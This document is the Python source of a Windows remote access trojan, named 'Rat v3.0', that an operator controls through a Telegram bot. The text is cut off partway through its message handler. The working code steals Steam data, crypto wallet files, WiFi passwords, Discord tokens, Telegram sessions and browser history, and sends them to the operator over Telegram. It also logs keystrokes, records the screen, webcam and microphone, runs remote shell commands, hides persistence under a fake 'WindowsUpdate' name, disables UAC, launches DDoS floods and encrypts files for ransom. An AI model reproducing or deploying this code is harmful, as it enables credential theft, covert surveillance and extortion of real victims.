import os
import sys
import re
import time
import socket
import platform
import subprocess
import threading
import sqlite3
import json
import base64
import ctypes
import winreg
import shutil
import zipfile
import random
import string
import hashlib
import tempfile
from datetime import datetime
from io import BytesIO
from pathlib import Path
from PIL import ImageGrab, Image
import psutil
import requests
import sounddevice as sd
import soundfile as sf
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler

# ============ КОНФИГ ============
TOKEN = "{{TOKEN}}"
ADMIN_ID = {{ADMIN_ID}}
PC_ID = socket.gethostname() + "_" + os.getlogin()
VERSION = "3.0"

# ============ СИСТЕМНЫЕ ФУНКЦИИ ============
def execute_cmd(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout if result.stdout else result.stderr
    except:
        return "Error"

def execute_powershell(script):
    try:
        result = subprocess.run(["powershell", "-Command", script], capture_output=True, text=True, timeout=30)
        return result.stdout if result.stdout else result.stderr
    except:
        return "Error"

def get_system_info():
    try:
        return f"""
╔══════════════════════════════════════════╗
║           SYSTEM INFORMATION             ║
╠══════════════════════════════════════════╣
║ PC Name:    {socket.gethostname():<20} ║
║ User:       {os.getlogin():<20} ║
║ OS:         {platform.system()} {platform.release():<10} ║
║ RAM Total:  {round(psutil.virtual_memory().total / (1024**3))} GB ║
║ Disk Total: {round(psutil.disk_usage('/').total / (1024**3))} GB ║
╚══════════════════════════════════════════╝
"""
    except:
        return "System info error"

def get_screenshot():
    try:
        screenshot = ImageGrab.grab()
        img_bytes = BytesIO()
        screenshot.save(img_bytes, format='PNG')
        return img_bytes.getvalue()
    except:
        return None

def block_input(block=True):
    try:
        ctypes.windll.user32.BlockInput(block)
        return "✅ Blocked" if block else "✅ Unblocked"
    except:
        return "❌ Failed"

def minimize_all_windows():
    try:
        ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x44, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x44, 0, 2, 0)
        ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)
        return "✅ Windows minimized"
    except:
        return "❌ Failed"

def close_active_window():
    try:
        ctypes.windll.user32.keybd_event(0x12, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x73, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x73, 0, 2, 0)
        ctypes.windll.user32.keybd_event(0x12, 0, 2, 0)
        return "✅ Window closed"
    except:
        return "❌ Failed"

def show_messagebox(text):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, "Alert", 0)
        return "✅ Shown"
    except:
        return "❌ Failed"

def get_location():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        loc = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        return f"IP: {ip}\nCountry: {loc.get('country')}\nCity: {loc.get('city')}\nISP: {loc.get('isp')}"
    except:
        return "❌ Location error"

# ============ СТИМ ============
def steal_steam():
    try:
        data = []
        steam_paths = [
            os.path.join(os.getenv('PROGRAMFILES', ''), 'Steam'),
            os.path.join(os.getenv('PROGRAMFILES(X86)', ''), 'Steam'),
            os.path.join(os.getenv('LOCALAPPDATA', ''), 'Steam'),
        ]
        for path in steam_paths:
            if os.path.exists(path):
                data.append(f"\n=== Steam found: {path} ===")
                config_path = os.path.join(path, 'config', 'loginusers.vdf')
                if os.path.exists(config_path):
                    with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                        data.append(f.read())
                userdata_path = os.path.join(path, 'userdata')
                if os.path.exists(userdata_path):
                    data.append(f"User data: {userdata_path}")
                ssfn_files = [f for f in os.listdir(path) if f.startswith('ssfn')]
                if ssfn_files:
                    data.append(f"SSFN files: {', '.join(ssfn_files)}")
        return "\n".join(data) if data else "Steam not found"
    except Exception as e:
        return f"Error: {e}"

# ============ КРИПТО ============
def steal_crypto():
    try:
        data = ["=== Crypto Wallets ==="]
        wallet_paths = [
            os.path.join(os.getenv('APPDATA', ''), 'Electrum'),
            os.path.join(os.getenv('APPDATA', ''), 'Exodus'),
            os.path.join(os.getenv('APPDATA', ''), 'Atomic'),
            os.path.join(os.getenv('APPDATA', ''), 'Zcash'),
            os.path.join(os.getenv('APPDATA', ''), 'Monero'),
            os.path.join(os.getenv('LOCALAPPDATA', ''), 'MetaMask'),
            os.path.join(os.getenv('APPDATA', ''), 'Coinomi'),
        ]
        for path in wallet_paths:
            if os.path.exists(path):
                data.append(f"\n=== {os.path.basename(path)} ===")
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith(('.dat', '.wallet', '.json', '.key')):
                            data.append(f"  {os.path.join(root, file)}")
        return "\n".join(data) if len(data) > 1 else "No crypto wallets found"
    except Exception as e:
        return f"Error: {e}"

# ============ DDoS ============
ddos_active = False

def start_ddos(target, duration=60):
    global ddos_active
    if ddos_active:
        return "⚠️ Already running!"
    def attack():
        global ddos_active
        end = time.time() + duration
        while time.time() < end and ddos_active:
            try:
                requests.get(target, timeout=1)
                requests.post(target, timeout=1)
            except:
                pass
        ddos_active = False
    ddos_active = True
    threading.Thread(target=attack).start()
    return f"🔥 DDoS started on {target}"

def stop_ddos():
    global ddos_active
    ddos_active = False
    return "🛑 DDoS stopped"

# ============ ПРОЦЕССЫ ============
def kill_process(name):
    try:
        killed = 0
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and name.lower() in proc.info['name'].lower():
                proc.kill()
                killed += 1
        return f"✅ Killed {killed} process(es)"
    except:
        return "❌ Error"

def start_process(path):
    try:
        subprocess.Popen([path], shell=True)
        return f"✅ Started: {path}"
    except:
        return f"❌ Failed: {path}"

def list_processes():
    try:
        procs = []
        for proc in psutil.process_iter(['name', 'pid', 'memory_percent']):
            try:
                procs.append(f"{proc.info['pid']}: {proc.info['name']} ({proc.info['memory_percent']:.1f}%)")
            except:
                pass
        return "\n".join(procs[:30])
    except:
        return "Error"

# ============ СИСТЕМНЫЕ ДЕЙСТВИЯ ============
def shutdown_pc():
    os.system("shutdown /s /t 0")
    return "✅ Shutting down..."

def reboot_pc():
    os.system("shutdown /r /t 0")
    return "✅ Rebooting..."

def disable_uac():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return "✅ UAC disabled (reboot required)"
    except:
        return "❌ Failed"

def add_persistence():
    try:
        exe_path = sys.executable
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        return "✅ Persistence added"
    except:
        return "❌ Failed"

# ============ КРАЖА ДАННЫХ ============
def steal_wifi():
    try:
        result = execute_cmd("netsh wlan show profiles")
        passwords = []
        for line in result.split('\n'):
            if "All User Profile" in line:
                name = line.split(':')[1].strip()
                info = execute_cmd(f'netsh wlan show profile name="{name}" key=clear')
                for l in info.split('\n'):
                    if "Key Content" in l:
                        passwords.append(f"{name}: {l.split(':')[1].strip()}")
        return "\n".join(passwords) if passwords else "No WiFi passwords found"
    except:
        return "Error"

def steal_discord():
    try:
        tokens = []
        paths = [
            os.path.join(os.getenv('APPDATA'), 'Discord'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Discord'),
            os.path.join(os.getenv('APPDATA'), 'DiscordCanary'),
        ]
        for path in paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith('.ldb'):
                            try:
                                with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                    matches = re.findall(r'[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}', f.read())
                                    tokens.extend(matches)
                            except:
                                pass
        return '\n'.join(set(tokens)) if tokens else "No Discord tokens found"
    except:
        return "Error"

def steal_telegram():
    try:
        temp_dir = os.path.join(os.environ['TEMP'], 'tg_sessions')
        os.makedirs(temp_dir, exist_ok=True)
        paths = [
            os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Telegram Desktop', 'tdata'),
        ]
        for path in paths:
            if os.path.exists(path):
                shutil.copytree(path, os.path.join(temp_dir, os.path.basename(os.path.dirname(path))), dirs_exist_ok=True)
        zip_path = os.path.join(os.environ['TEMP'], 'telegram_sessions.zip')
        shutil.make_archive(zip_path.replace('.zip', ''), 'zip', temp_dir)
        shutil.rmtree(temp_dir)
        return zip_path
    except:
        return "Error"

def steal_browser_history():
    try:
        data = []
        browsers = [
            ('Chrome', os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default')),
            ('Edge', os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default')),
            ('Brave', os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default')),
        ]
        for name, path in browsers:
            history_path = os.path.join(path, 'History')
            if os.path.exists(history_path):
                try:
                    temp_file = tempfile.mktemp()
                    shutil.copy(history_path, temp_file)
                    conn = sqlite3.connect(temp_file)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count DESC LIMIT 100")
                    rows = cursor.fetchall()
                    conn.close()
                    os.remove(temp_file)
                    if rows:
                        data.append(f"\n=== {name} History ===")
                        for row in rows:
                            url = row[0] or ''
                            title = row[1] or ''
                            visits = row[2] or 0
                            data.append(f"{visits}x | {title[:50]} | {url[:80]}")
                except:
                    pass
        return "\n".join(data) if data else "No history found"
    except Exception as e:
        return f"Error: {e}"

# ============ АУДИО ============
def record_audio(duration=5):
    try:
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        filename = f"audio_{datetime.now().strftime('%H%M%S')}.wav"
        sf.write(filename, recording, fs)
        return filename
    except:
        return "Error"

def set_volume(level):
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(level / 100, None)
        return f"✅ Volume set to {level}%"
    except:
        return "❌ Failed"

# ============ ШИФРОВАНИЕ ============
def encrypt_files(path, password):
    try:
        if os.path.isfile(path):
            return encrypt_file(path, password)
        elif os.path.isdir(path):
            return encrypt_dir(path, password)
        return "❌ Path not found"
    except Exception as e:
        return f"❌ Error: {e}"

def encrypt_file(file_path, password):
    try:
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        f = Fernet(key)
        with open(file_path, 'rb') as file:
            data = file.read()
        encrypted = f.encrypt(data)
        with open(file_path + '.enc', 'wb') as file:
            file.write(salt + encrypted)
        os.remove(file_path)
        return f"✅ Encrypted: {file_path}"
    except:
        return f"❌ Failed: {file_path}"

def encrypt_dir(dir_path, password):
    count = 0
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            if not file.endswith('.enc'):
                try:
                    encrypt_file(os.path.join(root, file), password)
                    count += 1
                except:
                    pass
    return f"✅ Encrypted {count} files"

def decrypt_files(path, password):
    try:
        if os.path.isfile(path) and path.endswith('.enc'):
            return decrypt_file(path, password)
        elif os.path.isdir(path):
            return decrypt_dir(path, password)
        return "❌ Path not found"
    except Exception as e:
        return f"❌ Error: {e}"

def decrypt_file(file_path, password):
    try:
        with open(file_path, 'rb') as file:
            salt = file.read(16)
            encrypted = file.read()
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        f = Fernet(key)
        decrypted = f.decrypt(encrypted)
        original = file_path[:-4]
        with open(original, 'wb') as file:
            file.write(decrypted)
        os.remove(file_path)
        return f"✅ Decrypted: {original}"
    except:
        return f"❌ Failed"

def decrypt_dir(dir_path, password):
    count = 0
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            if file.endswith('.enc'):
                try:
                    decrypt_file(os.path.join(root, file), password)
                    count += 1
                except:
                    pass
    return f"✅ Decrypted {count} files"

# ============ ЭФФЕКТЫ ============
def trigger_bsod():
    try:
        ntdll = ctypes.windll.ntdll
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        ntdll.NtRaiseHardError(0xC000021A, 0, 0, None, 6, ctypes.byref(ctypes.c_uint()))
        return "💀 BSOD triggered"
    except:
        return "❌ Failed"

def scare_screen():
    try:
        import tkinter as tk
        root = tk.Tk()
        root.attributes('-fullscreen', True, '-topmost', True)
        root.configure(bg='red')
        label = tk.Label(root, text="⚠️ YOUR SYSTEM HAS BEEN HACKED ⚠️", font=('Arial', 40, 'bold'), fg='white', bg='red')
        label.place(relx=0.5, rely=0.5, anchor='center')
        root.after(10000, root.destroy)
        root.mainloop()
        return "👻 Scare screen shown"
    except:
        return "❌ Failed"

def broken_pixels():
    try:
        import tkinter as tk
        import random
        root = tk.Tk()
        root.attributes('-fullscreen', True, '-topmost', True)
        root.attributes('-transparentcolor', 'black')
        root.configure(bg='black')
        canvas = tk.Canvas(root, bg='black', highlightthickness=0)
        canvas.pack(fill=tk.BOTH, expand=True)
        for _ in range(random.randint(50, 150)):
            x = random.randint(0, root.winfo_screenwidth())
            y = random.randint(0, root.winfo_screenheight())
            color = random.choice(['red', 'green', 'blue', 'white', 'yellow', 'magenta'])
            canvas.create_rectangle(x, y, x+2, y+2, fill=color, outline=color)
        root.after(30000, root.destroy)
        root.mainloop()
        return "🖤 Broken pixels effect shown"
    except:
        return "❌ Failed"

def pixellate_screen():
    try:
        import tkinter as tk
        root = tk.Tk()
        root.attributes('-fullscreen', True, '-topmost', True)
        pb = tk.Label(root)
        pb.pack(fill=tk.BOTH, expand=True)
        def update():
            try:
                img = ImageGrab.grab()
                small = img.resize((80, 60), Image.NEAREST)
                big = small.resize(img.size, Image.NEAREST)
                from PIL import ImageTk
                tk_img = ImageTk.PhotoImage(big)
                pb.config(image=tk_img)
                pb.image = tk_img
                root.after(50, update)
            except:
                pass
        update()
        root.after(10000, root.destroy)
        root.mainloop()
        return "🌀 Pixellation effect activated"
    except:
        return "❌ Failed"

def scream_make(video_path):
    try:
        os.system(f'start "" "{video_path}" /fullscreen')
        return f"✅ Video playing: {video_path}"
    except:
        return "❌ Failed"

# ============ УПРАВЛЕНИЕ ФАЙЛАМИ ============
def download_file(url):
    try:
        filename = url.split('/')[-1].split('?')[0] or 'download'
        response = requests.get(url, timeout=30)
        with open(filename, 'wb') as f:
            f.write(response.content)
        return f"✅ Downloaded: {filename}"
    except:
        return "❌ Failed"

def download_file_from_pc(file_path):
    try:
        if os.path.exists(file_path):
            return file_path
        return None
    except:
        return None

def upload_file_to_pc(file_bytes, filename):
    try:
        with open(filename, 'wb') as f:
            f.write(file_bytes)
        return f"✅ File saved: {filename}"
    except:
        return "❌ Failed"

def list_files(path):
    try:
        if not os.path.exists(path):
            return "❌ Path not found"
        result = []
        for item in os.listdir(path):
            full = os.path.join(path, item)
            if os.path.isfile(full):
                result.append(f"📄 {item} ({os.path.getsize(full)} bytes)")
            else:
                result.append(f"📁 {item}/")
        return "\n".join(result[:50])
    except:
        return "❌ Error"

def set_wallpaper(image_path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0x01 | 0x02)
        return f"✅ Wallpaper changed: {image_path}"
    except:
        return "❌ Failed"

# ============ SCREEN RECORD ============
def record_screen(duration=10):
    try:
        import cv2
        import numpy as np
        from PIL import ImageGrab
        
        screen = ImageGrab.grab()
        width, height = screen.size
        filename = f"screen_record_{datetime.now().strftime('%H%M%S')}.avi"
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(filename, fourcc, 10, (width, height))
        
        for _ in range(duration * 10):
            img = ImageGrab.grab()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            out.write(frame)
            time.sleep(0.1)
        
        out.release()
        return filename
    except:
        return "Error"

# ============ WEBCAM ============
def record_webcam(duration=10):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "❌ Webcam not found"
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        filename = f"webcam_{datetime.now().strftime('%H%M%S')}.avi"
        out = cv2.VideoWriter(filename, fourcc, 20, (640, 480))
        start = time.time()
        while time.time() - start < duration:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
        cap.release()
        out.release()
        return filename
    except:
        return "Error"

# ============ KEYLOGGER ============
class Keylogger:
    def __init__(self):
        self.hook_id = None
        self.log = []
        self.user32 = ctypes.windll.user32
        
    def start(self):
        try:
            WH_KEYBOARD_LL = 13
            WM_KEYDOWN = 0x0100
            HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int))
            self.hook_proc = HOOKPROC(self._hook_callback)
            self.hook_id = self.user32.SetWindowsHookExW(WH_KEYBOARD_LL, self.hook_proc, None, 0)
            return "✅ Keylogger started"
        except:
            return "❌ Failed"
    
    def _hook_callback(self, nCode, wParam, lParam):
        if nCode >= 0 and wParam == 0x0100:
            key_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_int)).contents.value
            self.log.append(f"0x{key_code:X}")
            if len(self.log) >= 100:
                self._save_log()
        return self.user32.CallNextHookEx(self.hook_id, nCode, wParam, lParam)
    
    def _save_log(self):
        try:
            with open("keylog.txt", "a") as f:
                f.write(f"{datetime.now()}: {' '.join(self.log)}\n")
            self.log.clear()
        except:
            pass
    
    def stop(self):
        if self.hook_id:
            self.user32.UnhookWindowsHookEx(self.hook_id)
            if self.log:
                self._save_log()
            return "✅ Stopped"
        return "❌ Not running"
    
    def dump(self):
        if os.path.exists("keylog.txt"):
            with open("keylog.txt", "r") as f:
                return f.read()
        return "No logs"

keylogger = Keylogger()

# ============ БОТ ============
bot = Bot(TOKEN)
updater = Updater(TOKEN, use_context=True)
dp = updater.dispatcher

def start(update, context):
    keyboard = [
        [InlineKeyboardButton("📸 Screenshot", callback_data="screenshot")],
        [InlineKeyboardButton("🎥 Screen Record", callback_data="screenrecord")],
        [InlineKeyboardButton("📷 Webcam", callback_data="webcam")],
        [InlineKeyboardButton("🖥️ System Info", callback_data="system")],
        [InlineKeyboardButton("📟 CMD", callback_data="cmd")],
        [InlineKeyboardButton("⚡ PowerShell", callback_data="powershell")],
        [InlineKeyboardButton("📋 Process List", callback_data="processes")],
        [InlineKeyboardButton("💀 Kill Process", callback_data="kill")],
        [InlineKeyboardButton("🚀 Start Process", callback_data="startproc")],
        [InlineKeyboardButton("🔥 DDoS Start", callback_data="ddos_start")],
        [InlineKeyboardButton("🛑 DDoS Stop", callback_data="ddos_stop")],
        [InlineKeyboardButton("🚫 Block Input", callback_data="block")],
        [InlineKeyboardButton("✅ Unblock Input", callback_data="unblock")],
        [InlineKeyboardButton("📶 WiFi Passwords", callback_data="wifi")],
        [InlineKeyboardButton("🎮 Discord Tokens", callback_data="discord")],
        [InlineKeyboardButton("📱 Telegram Sessions", callback_data="telegram")],
        [InlineKeyboardButton("🔒 Encrypt Files", callback_data="encrypt")],
        [InlineKeyboardButton("🔓 Decrypt Files", callback_data="decrypt")],
        [InlineKeyboardButton("🎤 Record Audio", callback_data="audio")],
        [InlineKeyboardButton("🔊 Volume Max", callback_data="volmax")],
        [InlineKeyboardButton("🔈 Volume Min", callback_data="volmin")],
        [InlineKeyboardButton("🔒 Persistence", callback_data="persist")],
        [InlineKeyboardButton("🔓 Disable UAC", callback_data="uac")],
        [InlineKeyboardButton("💀 BSOD", callback_data="bsod")],
        [InlineKeyboardButton("👻 Scare Screen", callback_data="scare")],
        [InlineKeyboardButton("🖤 Broken Pixels", callback_data="brokenpixels")],
        [InlineKeyboardButton("🌀 Pixellate", callback_data="pixellate")],
        [InlineKeyboardButton("⬇️ Minimize All", callback_data="minimize")],
        [InlineKeyboardButton("❌ Close Window", callback_data="close")],
        [InlineKeyboardButton("💬 MessageBox", callback_data="msgbox")],
        [InlineKeyboardButton("📍 Location", callback_data="location")],
        [InlineKeyboardButton("📥 Download URL", callback_data="download")],
        [InlineKeyboardButton("📂 List Files", callback_data="listfiles")],
        [InlineKeyboardButton("📤 Upload File", callback_data="upload")],
        [InlineKeyboardButton("📥 Download File", callback_data="downloadfile")],
        [InlineKeyboardButton("🖼️ Wallpaper", callback_data="wallpaper")],
        [InlineKeyboardButton("🎬 Scream Make", callback_data="scream")],
        [InlineKeyboardButton("🎮 Steal Steam", callback_data="steam")],
        [InlineKeyboardButton("💰 Steal Crypto", callback_data="crypto")],
        [InlineKeyboardButton("📜 History", callback_data="history")],
        [InlineKeyboardButton("🔌 Shutdown", callback_data="shutdown")],
        [InlineKeyboardButton("🔄 Reboot", callback_data="reboot")],
        [InlineKeyboardButton("⌨️ Keylogger", callback_data="keylogger")],
    ]
    update.message.reply_text(
        f"🤖 Rat v{VERSION}\n🖥️ {PC_ID}\n📌 Choose:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

def callback(update, context):
    query = update.callback_query
    query.answer()
    chat_id = query.message.chat.id
    data = query.data

    if data == "screenshot":
        img = get_screenshot()
        if img:
            bot.send_photo(chat_id, photo=BytesIO(img), caption="📸 Screenshot")
        else:
            bot.send_message(chat_id, "❌ Failed")
    
    elif data == "screenrecord":
        context.user_data['screenrecord_mode'] = True
        bot.send_message(chat_id, "🎥 Enter duration (1-60 sec):")
    
    elif data == "webcam":
        context.user_data['webcam_mode'] = True
        bot.send_message(chat_id, "📷 Enter duration (1-60 sec):")
    
    elif data == "system":
        bot.send_message(chat_id, get_system_info())
    
    elif data == "cmd":
        context.user_data['cmd_mode'] = True
        bot.send_message(chat_id, "📟 Enter CMD:")
    
    elif data == "powershell":
        context.user_data['ps_mode'] = True
        bot.send_message(chat_id, "⚡ Enter PowerShell:")
    
    elif data == "processes":
        bot.send_message(chat_id, f"📋 Processes:\n{list_processes()}")
    
    elif data == "kill":
        context.user_data['kill_mode'] = True
        bot.send_message(chat_id, "💀 Enter process name:")
    
    elif data == "startproc":
        context.user_data['startproc_mode'] = True
        bot.send_message(chat_id, "🚀 Enter process path:")
    
    elif data == "ddos_start":
        context.user_data['ddos_mode'] = True
        bot.send_message(chat_id, "🔥 Enter target URL:")
    
    elif data == "ddos_stop":
        bot.send_message(chat_id, stop_ddos())
    
    elif data == "block":
        bot.send_message(chat_id, block_input(True))
    
    elif data == "unblock":
        bot.send_message(chat_id, block_input(False))
    
    elif data == "wifi":
        bot.send_message(chat_id, f"📶 WiFi:\n{steal_wifi()}")
    
    elif data == "discord":
        bot.send_message(chat_id, f"🎮 Discord:\n{steal_discord()}")
    
    elif data == "telegram":
        result = steal_telegram()
        if os.path.exists(result):
            with open(result, 'rb') as f:
                bot.send_document(chat_id, document=BytesIO(f.read()), filename="telegram_sessions.zip")
            os.remove(result)
        else:
            bot.send_message(chat_id, result)
    
    elif data == "history":
        bot.send_message(chat_id, f"📜 History:\n{steal_browser_history()}")
    
    elif data == "steam":
        bot.send_message(chat_id, f"🎮 Steam:\n{steal_steam()}")
    
    elif data == "crypto":
        bot.send_message(chat_id, f"💰 Crypto:\n{steal_crypto()}")
    
    elif data == "scream":
        context.user_data['scream_mode'] = True
        bot.send_message(chat_id, "🎬 Enter video path:")
    
    elif data == "brokenpixels":
        bot.send_message(chat_id, broken_pixels())
    
    elif data == "pixellate":
        bot.send_message(chat_id, pixellate_screen())
    
    elif data == "upload":
        context.user_data['upload_mode'] = True
        bot.send_message(chat_id, "📤 Send the file you want to upload:")
    
    elif data == "downloadfile":
        context.user_data['downloadfile_mode'] = True
        bot.send_message(chat_id, "📥 Enter file path to download:")
    
    elif data == "encrypt":
        context.user_data['encrypt_mode'] = True
        bot.send_message(chat_id, "🔒 Enter path:")
    
    elif data == "decrypt":
        context.user_data['decrypt_mode'] = True
        bot.send_message(chat_id, "🔓 Enter path:")
    
    elif data == "audio":
        context.user_data['audio_mode'] = True
        bot.send_message(chat_id, "🎤 Enter duration (1-60 sec):")
    
    elif data == "volmax":
        bot.send_message(chat_id, set_volume(100))
    
    elif data == "volmin":
        bot.send_message(chat_id, set_volume(0))
    
    elif data == "persist":
        bot.send_message(chat_id, add_persistence())
    
    elif data == "uac":
        bot.send_message(chat_id, disable_uac())
    
    elif data == "bsod":
        bot.send_message(chat_id, trigger_bsod())
    
    elif data == "scare":
        bot.send_message(chat_id, scare_screen())
    
    elif data == "minimize":
        bot.send_message(chat_id, minimize_all_windows())
    
    elif data == "close":
        bot.send_message(chat_id, close_active_window())
    
    elif data == "msgbox":
        context.user_data['msgbox_mode'] = True
        bot.send_message(chat_id, "💬 Enter text:")
    
    elif data == "location":
        bot.send_message(chat_id, get_location())
    
    elif data == "download":
        context.user_data['download_mode'] = True
        bot.send_message(chat_id, "📥 Enter URL:")
    
    elif data == "listfiles":
        context.user_data['listfiles_mode'] = True
        bot.send_message(chat_id, "📂 Enter path:")
    
    elif data == "wallpaper":
        context.user_data['wallpaper_mode'] = True
        bot.send_message(chat_id, "🖼️ Enter image path:")
    
    elif data == "shutdown":
        bot.send_message(chat_id, shutdown_pc())
    
    elif data == "reboot":
        bot.send_message(chat_id, reboot_pc())
    
    elif data == "keylogger":
        result = keylogger.dump()
        bot.send_message(chat_id, f"⌨️ Keylogger:\n{result}")

def handle_message(update, context):
    chat_id = update.message.chat.id
    text = update.message.text

    if context.user_data.get('cmd_mode'):
        context.user_data['cmd_mode'] = False
        bot.send_message(chat_id, f"📟 CMD:\n{execute_cmd(text)[:4000]}")
    
    elif context.user_data.get('ps_mode'):
        context.user_data['ps_mode'] = False
        bot.send_message(chat_id, f"⚡ PowerShell:\n{execute_powershell(text)[:4000]}")
    
    elif context.user_data.get('kill_mode'):
        context.user_data['kill_mode'] = False
        bot.send_message(chat_id, kill_process(text))
    
    elif context.user_data.get('startproc_mode'):
        context.user_data['startproc_mode'] = False
        bot.send_message(chat_id, start_process(text))
    
    elif context.user_data.get('ddos_mode'):
        context.user_data['ddos_mode'] = False
        bot.send_message(chat_id, start_ddos(text))
    
    elif context.user_data.get('screenrecord_mode'):
        context.user_data['screenrecord_mode'] = False
        try:
            duration = int(text)
            if 1 <= duration <= 60:
                filename = record_screen(duration)
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        bot.send_video(chat_id, video=BytesIO(f.read()), filename=filename)
                    os.remove(filename)
            else:
                bot.send_message(chat_id, "❌ 1-60 sec only")
        except:
            bot.send_message(chat_id, "❌ Invalid")
    
    elif context.user_data.get('webcam_mode'):
        context.user_data['webcam_mode'] = False
        try:
            duration = int(text)
            if 1 <= duration <= 60:
                filename = record_webcam(duration)
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        bot.send_video(chat_id, video=BytesIO(f.read()), filename=filename)
                    os.remove(filename)
            else:
                bot.send_message(chat_id, "❌ 1-60 sec only")
        except:
            bot.send_message(chat_id, "❌ Invalid")
    
    elif context.user_data.get('scream_mode'):
        context.user_data['scream_mode'] = False
        bot.send_message(chat_id, scream_make(text))
    
    elif context.user_data.get('upload_mode'):
        context.user_data['upload_mode'] = False
        bot.send_message(chat_id, "📤 Send the file as a document:")
        context.user_data['awaiting_upload'] = True
    
    elif context.user_data.get('downloadfile_mode'):
        context.user_data['downloadfile_mode'] = False
        file_path = text
        result = download_file_from_pc(file_path)
        if result:
            with open(result, 'rb') as f:
                bot.send_document(chat_id, document=BytesIO(f.read()), filename=os.path.basename(result))
        else:
            bot.send_message(chat_id, "❌ File not found")
    
    elif context.user_data.get('encrypt_mode'):
        context.user_data['encrypt_mode'] = False
        context.user_data['encrypt_pass_mode'] = True
        context.user_data['encrypt_path'] = text
        bot.send_message(chat_id, "🔒 Enter password:")
    
    elif context.user_data.get('encrypt_pass_mode'):
        context.user_data['encrypt_pass_mode'] = False
        bot.send_message(chat_id, encrypt_files(context.user_data['encrypt_path'], text))
    
    elif context.user_data.get('decrypt_mode'):
        context.user_data['decrypt_mode'] = False
        context.user_data['decrypt_pass_mode'] = True
        context.user_data['decrypt_path'] = text
        bot.send_message(chat_id, "🔓 Enter password:")
    
    elif context.user_data.get('decrypt_pass_mode'):
        context.user_data['decrypt_pass_mode'] = False
        bot.send_message(chat_id, decrypt_files(context.user_data['decrypt_path'], text))
    
    elif context.user_data.get('audio_mode'):
        context.user_data['audio_mode'] = False
        try:
            duration = int(text)
            if 1 <= duration <= 60:
                filename = record_audio(duration)
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        bot.send_audio(chat_id, audio=BytesIO(f.read()), filename=filename)
                    os.remove(filename)
            else:
                bot.send_message(chat_id, "❌ 1-60 sec only")
        except:
            bot.send_message(chat_id, "❌ Invalid")
    
    elif context.user_data.get('msgbox_mode'):
        context.user_data['msgbox_mode'] = False
        bot.send_message(chat_id, show_messagebox(text))
    
    elif context.user_data.get('download_mode'):
        context.user_data['download_mode'] = False
        bot.send_message(chat_id, download_file(text))
    
    elif context.user_data.get('listfiles_mode'):
